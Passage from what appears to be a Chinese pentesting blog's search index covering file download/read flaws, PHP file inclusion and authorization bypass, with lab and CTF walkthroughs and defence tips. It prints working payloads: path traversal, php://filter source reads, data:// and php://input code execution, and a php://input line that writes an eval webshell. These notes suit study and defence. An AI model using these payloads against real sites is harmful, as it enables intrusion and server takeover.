+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>显示源代码，则为文件读取漏洞</p>
+<p>提示文件下载，则为文件下载漏洞</p>
+<p>文件被解析成脚本语言，则为文件包含漏洞</p>
+<span id="more"></span>
+
+<h2 id="漏洞检测点"><a href="#漏洞检测点" class="headerlink" title="漏洞检测点"></a>漏洞检测点</h2><h3 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h3><p>read.xxx?filename=</p>
+<p>down.xxx?filename=</p>
+<h3 id="参数值"><a href="#参数值" class="headerlink" title="参数值"></a>参数值</h3><p>&amp;readpath=    &amp;filepath=    &amp;path=    &amp;inputfile=    &amp;url=    &amp;data=    &amp;readfile=    &amp;menu=    META-INF=    WEB-INF</p>
+<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>参数值有的会用加密算法进行<strong>加密</strong>，所以在下载想要的文件，需要对该文件路径进行加密</p>
+<h3 id="目录符号"><a href="#目录符号" class="headerlink" title="目录符号"></a>目录符号</h3><p><code>../</code>    <code>..\</code>    <code>./</code>    <code>.\</code>等</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h2 id="常见文件"><a href="#常见文件" class="headerlink" title="常见文件"></a>常见文件</h2><p>后台首页日志等可见文件</p>
+<h3 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h3><p>数据库配置文件下载或读取及后续</p>
+<p>接口密匙信息文件下载或读取及后续</p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="pikachu任意文件下载"><a href="#pikachu任意文件下载" class="headerlink" title="pikachu任意文件下载"></a>pikachu任意文件下载</h3><p>访问靶场后查看右键复制图片地址进行查看</p>
+<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/pikachu%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-wp1.png" alt="pikachu任意文件下载-wp1"></p>
+<p>得到图片地址为<code>http://127.0.0.1:8080/pikachu/vul/unsafedownload/download/ai.png</code></p>
+<p>右键复制查看下载地址</p>
+<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/pikachu%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-wp1.png" alt="pikachu任意文件下载-wp1"></p>
+<p>得到下载地址为<code>http://127.0.0.1:8080/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png</code></p>
+<p>现在我们通过漏洞下载<code>execdownload.php</code>文件，查看其源代码，但由于<code>execdownload.php</code>文件在<code>ai.png</code>的上一级目录，所以我们构造的攻击语句为</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/pikachu/vul/unsafedownload/execdownload.php?filename=../execdownload.php</span><br></pre></td></tr></table></figure>
+
+<p>得到源码，得到下载漏洞目录是<code>download/</code></p>
+<p><img src="/2021/09/04/Web%E6%BC%8F%E6%B4%9E-6-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/pikachu%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-wp3.png" alt="pikachu任意文件下载-wp3"></p>
+<p>接下来我们通过该漏洞去下载<strong>敏感文件</strong>或<strong>配置文件</strong></p>
+<p>但一般这些文件需要知道绝对路径，我们可以使用扫描器去扫，用大一点的字典去跑</p>
+<h3 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a><a href="https://buuoj.cn/challenges#[RoarCTF%202019]Easy%20Java">[RoarCTF 2019]Easy Java</a></h3><p>Java开发的项目文件下载一般用POST传参</p>
+<p>此题读取WEB配置文件WEB-INF/web.xml</p>
+<p><a href="https://blog.csdn.net/ChenZIDu/article/details/103533554">https://blog.csdn.net/ChenZIDu/article/details/103533554</a></p>
+<p><a href="https://blog.csdn.net/silencediors/article/details/102579567">https://blog.csdn.net/silencediors/article/details/102579567</a></p>
+<h3 id="“百度杯”CTF比赛-2017-二月场-Zone"><a href="#“百度杯”CTF比赛-2017-二月场-Zone" class="headerlink" title="“百度杯”CTF比赛 2017 二月场-Zone"></a><a href="https://www.ichunqiu.com/battalion?t=1&r=57475">“百度杯”CTF比赛 2017 二月场-Zone</a></h3><p><a href="https://www.ichunqiu.com/writeup/detail/4941">https://www.ichunqiu.com/writeup/detail/4941</a></p>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="小米路由器远程任意文件读取漏洞"><a href="#小米路由器远程任意文件读取漏洞" class="headerlink" title="小米路由器远程任意文件读取漏洞"></a><a href="https://www.seebug.org/vuldb/ssvid-98122">小米路由器远程任意文件读取漏洞</a></h3><h2 id="Java文件下载"><a href="#Java文件下载" class="headerlink" title="Java文件下载"></a>Java文件下载</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></p>
+<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><p>mvc框架：model view controller</p>
+<p><a href="http://www.baidu.com/link?url=UA_cyTHHSeD2kK_DpzJiSGieQvPpY5mbLBFq_VFEUXTcAOW-Epp3yUjbjrAAWdyD_DrfySzJdTu7haN3brxyUa&wd=&eqid=a8af765e000244620000000661330346"><em>MVC 模式</em> | 菜鸟教程</a></p>
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>文件下载</tag>
+        <tag>文件读取</tag>
+        <tag>文件操作</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%AE%89%E5%85%A8.png" alt="文件操作安全"></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>将包含文件以脚本代码执行</p>
+<span id="more"></span>
+
+<h2 id="文件包含各个脚本代码"><a href="#文件包含各个脚本代码" class="headerlink" title="文件包含各个脚本代码"></a>文件包含各个脚本代码</h2><p>PHP：&lt;?php include(“test.php”);?&gt;</p>
+<p>ASP：&lt;!–#include file=”1.asp” –&gt;    </p>
+<p>ASPX：&lt;!–include file=”1.aspx” –&gt;</p>
+<p>JSP：&lt;c: import url=”<a href="http://thief.one/1.jsp&quot;&gt;">http://thief.one/1.jsp&quot;&gt;</a></p>
+<p>​          &lt;jsp:include page=”head.jsp”/&gt;</p>
+<p>​          &lt;%@ include file=”head.jsp”%&gt;</p>
+<h2 id="php文件包含函数"><a href="#php文件包含函数" class="headerlink" title="php文件包含函数"></a>php文件包含函数</h2><h3 id="include-、require"><a href="#include-、require" class="headerlink" title="include()、require()"></a>include()、require()</h3><p>require()语句的性能与include()相类似，都是包括并运行指定文件。不同之处在于：对include()语句来说，在执行文件时每次都要进行<strong>读取和评估</strong>；而对于require()来说，文件只处理一次（<strong>实际上，文件内容替换require()语句</strong>）。</p>
+<p>这就意味着如果可能执行多次的代码，则使用require()效率比较高。另外一方面，如果每次执行代码时是读取不同的文件，或者有通过一组文件迭代的循环，就使用include()语句。</p>
+<h3 id="include-once-、require-once"><a href="#include-once-、require-once" class="headerlink" title="include_once()、require_once()"></a>include_once()、require_once()</h3><p>如果该文件中的代码已经被包括了，则不会再次包括。</p>
+<p>这两个语句应该用于在脚本执行期间，同一个文件有可能被包括超过一次的情况下，确保它只被包括一次，以避免函数重定义以及变量重新赋值等问题。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/shenpengchao/article/details/52326233">PHP中include和require的区别详解</a></p>
+<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>含义：包含网站所在本地的文件</p>
+<p>无限制</p>
+<p>直接包含本地文件即可，还可以进行目录穿越</p>
+<p>有限制</p>
+<p>1.%00截断</p>
+<p>条件：<code>magic_quotes_gpc = Off</code>且<code>PHP版本&lt;5.3.4</code></p>
+<p>2.长度截断</p>
+<p>条件：Windows，文件命名最长256，可以重复添加<code>/.</code>或<code>.</code>等使长度超过256；Linux下需要长于4096</p>
+<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD.png" alt="长度截断"></p>
+<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB.png" alt="远程包含"></p>
+<p>含义：我们自己创建一个可以访问到的地址，利用该漏洞去包含我们创建地址的文件</p>
+<p>无限制</p>
+<p>直接包含文件即可，还可以进行目录穿越</p>
+<p>有限制：强制添加后缀等</p>
+<p>在文件名末尾加<code>%20</code>,<code>%23</code>,<code>?</code>都可以</p>
+<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%B7%BB%E5%8A%A0%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7.png" alt="添加特殊符号"></p>
+<h2 id="各种协议流-php"><a href="#各种协议流-php" class="headerlink" title="各种协议流(php)"></a>各种协议流(php)</h2><p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%90%84%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E5%92%8C%E6%96%B9%E6%B3%95.png" alt="各协议的利用条件和方法"></p>
+<h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>用于访问本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。</p>
+<h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、file://[文件的绝对路径和文件名]</span><br><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br><span class="line">2、[文件的相对路径和文件名]</span><br><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="http-、https"><a href="#http-、https" class="headerlink" title="http://、https://"></a>http://、https://</h3><p>URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源，通常用于远程包含。</p>
+<h4 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://网络路径和文件名</span><br><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h3><p>php:// 用于访问各个输入/输出流（I/O streams），经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p>
+<table>
+<thead>
+<tr>
+<th>协议</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php://input</td>
+<td align="left">可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
+</tr>
+<tr>
+<td>php://output</td>
+<td align="left">只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
+</tr>
+<tr>
+<td>php://fd</td>
+<td align="left">(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
+</tr>
+<tr>
+<td>php://memory php://temp</td>
+<td align="left">(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td align="left">(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
+</tr>
+</tbody></table>
+<h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
+<h4 id="用法-2"><a href="#用法-2" class="headerlink" title="用法"></a>用法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、data://text/plain,[代码内容]</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line">2、data://text/plain;base64,[base64加密后代码内容]</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="读取文件源码用法"><a href="#读取文件源码用法" class="headerlink" title="读取文件源码用法"></a>读取文件源码用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=[文件名]</span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure>
+
+<p>　</p>
+<h3 id="执行php代码用法"><a href="#执行php代码用法" class="headerlink" title="执行php代码用法"></a>执行php代码用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php://input + [POST DATA]</span><br><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>　　</p>
+<h3 id="写入一句话木马用法"><a href="#写入一句话木马用法" class="headerlink" title="写入一句话木马用法"></a>写入一句话木马用法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p>详见：<a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="南邮CTF-文件包含"><a href="#南邮CTF-文件包含" class="headerlink" title="南邮CTF-文件包含"></a><a href="http://4.chinalover.sinaapp.com/web7/index.php">南邮CTF-文件包含</a></h3><h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><p>本题考点是<strong>本地包含</strong>并<strong>读取</strong></p>
+<p>直接利用读文件协议<code>php://filter/read=convert.base64-encode/resource=index.php</code>，去读取index.php的源码</p>
+<p>得到:</p>
+<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%8D%97%E9%82%AECTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-wp1.png" alt="南邮CTF-文件包含-wp1"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</span><br></pre></td></tr></table></figure>
+
+<p>base64解密后得到flag</p>
+<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E5%8D%97%E9%82%AECTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-wp2.png" alt="南邮CTF-文件包含-wp2"></p>
+<p>拓展</p>
+<p>LFI：Local_File_Include</p>
+<h3 id="i春秋百度杯-2017年二月场-web-include"><a href="#i春秋百度杯-2017年二月场-web-include" class="headerlink" title="i春秋百度杯-2017年二月场-web-include"></a><a href="https://www.ichunqiu.com/battalion">i春秋百度杯-2017年二月场-web-include</a></h3><h4 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h4><p>判断系统类型：改后缀大小写，区分大小写是Linux，不区分则是Windows</p>
+<p>访问靶场后显示如下：</p>
+<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web-include-wp1.png" alt="web-include-wp1"></p>
+<p>直接先<code>?path=flag.php</code>，但无结果</p>
+<p>试试用php://input尝试命令执行</p>
+<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web-include-wp2.png" alt="web-include-wp2"></p>
+<p>再用cat去读该文件，并右键查看源码得到flag</p>
+<p><img src="/2021/09/03/Web%E6%BC%8F%E6%B4%9E-5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/web-include-wp3.png" alt="web-include-wp3"></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>固定后缀：include($filename.”.html”);</p>
+<p>固定文件：include(“1.php”);</p>
+<p>WAF产品</p>
+<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://pan.baidu.com/share/init?surl=x_mwVF--xxmoKAvDJ8mRsw">php文件包含漏洞源码</a>    提取码：xiao</p>
+]]></content>
+      <categories>
+        <category>小迪安全-Web渗透测试笔记</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>文件操作</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>逻辑越权</title>
+    <url>/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83.png" alt="逻辑越权"></p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E.png" alt="逻辑漏洞"></p>
+<span id="more"></span>
+
+<h2 id="水平垂直越权"><a href="#水平垂直越权" class="headerlink" title="水平垂直越权"></a>水平垂直越权</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83.png" alt="水平垂直越权"></p>
+<h4 id="水平"><a href="#水平" class="headerlink" title="水平"></a>水平</h4><p>通过更换某个ID之类的身份标识，从而使A账号获取（修改、删除等）B账号数据。（AB同级）</p>
+<h4 id="垂直"><a href="#垂直" class="headerlink" title="垂直"></a>垂直</h4><p>使用<strong>低权限</strong>身份的账号，<strong>发送高权</strong>限账号才能有的<strong>请求</strong>，获得其高权限的操作。</p>
+<h4 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a>未授权</h4><p>通过<strong>删除请求中的认证信息</strong>后重放该请求，依旧可以访问或者完成操作。（无需账户登录）</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="前端安全造成：界面"><a href="#前端安全造成：界面" class="headerlink" title="前端安全造成：界面"></a>前端安全造成：界面</h4><p>判断用户等级后，前端代码界面部分进行可选显示</p>
+<p>有的页面不显示，不代表不存在，只是权限不够</p>
+<p>漏洞点在只是没有显示，但是没有限制身份的访问</p>
+<h4 id="后端安全造成：数据库"><a href="#后端安全造成：数据库" class="headerlink" title="后端安全造成：数据库"></a>后端安全造成：数据库</h4><p>如果在访问网站数据包中有传输用户的编号、用户所属组编号或类型编号时，就可以尝试对这类值进行修改，这也是最基本的越权漏洞测试</p>
+<p>例如：</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>username</th>
+<th>password</th>
+<th>usertype</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>admin</td>
+<td>123456</td>
+<td>1</td>
+</tr>
+<tr>
+<td>2</td>
+<td>1ceC0la</td>
+<td>654321</td>
+<td>0</td>
+</tr>
+</tbody></table>
+<p>当登陆时，会调用数据库判断admin和1ceC0la的权限，即此处的usertype的值</p>
+<h3 id="修复防御方案"><a href="#修复防御方案" class="headerlink" title="修复防御方案"></a>修复防御方案</h3><p>1.前后端同时对用户输入信息进行校验，双重验证机制</p>
+<p>2.调用功能前验证用户是否有权限调用相关功能</p>
+<p>3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限</p>
+<p>4.直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理</p>
+<p>5.永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p>
+<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><h4 id="Pikachu-本地水平垂直越权"><a href="#Pikachu-本地水平垂直越权" class="headerlink" title="Pikachu-本地水平垂直越权"></a>Pikachu-本地水平垂直越权</h4><p><a href="https://blog.csdn.net/weixin_50699777/article/details/116047307">https://blog.csdn.net/weixin_50699777/article/details/116047307</a></p>
+<h4 id="墨者学院-身份认证失效漏洞实战"><a href="#墨者学院-身份认证失效漏洞实战" class="headerlink" title="墨者学院-身份认证失效漏洞实战"></a><a href="https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe">墨者学院-身份认证失效漏洞实战</a></h4><h5 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h5><p>访问靶场所在地址后</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp1.png" alt="身份认证失效漏洞实战-wp1"></p>
+<p>登录所给的test账户</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp2.png" alt="身份认证失效漏洞实战-wp2"></p>
+<p>打开burp刷新页面抓包，发现一个有id的包</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp3.png" alt="身份认证失效漏洞实战-wp3"></p>
+<p>发到<code>Repeater</code>发包看响应的内容，有用户名，和经过加密的密码</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp4.png" alt="身份认证失效漏洞实战-wp4"></p>
+<p>此处密码有32位，应该是md5加密</p>
+<p>网上搜索md5解密，来解密这段密文</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp5.png" alt="身份认证失效漏洞实战-wp5"></p>
+<p>结果确实是test，故这是用md5来加密的</p>
+<p>之后改id值继续发包，把末位的22改成21</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp6.png" alt="身份认证失效漏洞实战-wp6"></p>
+<p>有响应数据，说明存在越权漏洞，因为看到了不属于当前用户的信息</p>
+<p>于是将数据报发到<code>Intruder</code>爆破存在的id账户信息</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp7.png" alt="身份认证失效漏洞实战-wp7"></p>
+<p>题目是让我们找到马春生的信息，故需要登录马春生的账户</p>
+<p>这里需要找到马春生的用户名，注意到首页登陆页面马春生的头像</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp8.png" alt="身份认证失效漏洞实战-wp8"></p>
+<p>右键在新标签页中打开图片</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp9.png" alt="身份认证失效漏洞实战-wp9"></p>
+<p>发现图片名命和之前发现的id类似，于是就去对比，发现是匹配的</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp10.png" alt="身份认证失效漏洞实战-wp10"></p>
+<p>于是解密加密数据进行登录</p>
+<p>用户名：m233241</p>
+<p>password解密结果：9732343</p>
+<p>登陆成功，得到key</p>
+<p><img src="/2021/08/29/Web%E6%BC%8F%E6%B4%9E-7-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-wp11.png" alt="身份认证失效漏洞实战-wp11"></p>
+<h3 id="越权检测工具"><a href="#越权检测工具" class="headerlink" title="越权检测工具"></a>越权检测工具</h3><h4 id="小米范"><a href="#小米范" class="headerlink" title="小米范"></a>小米范</h4><p><a href="https://www.cnblogs.com/fsqsec/p/5697517.html">https://www.cnblogs.com/fsqsec/p/5697517.html</a></p>
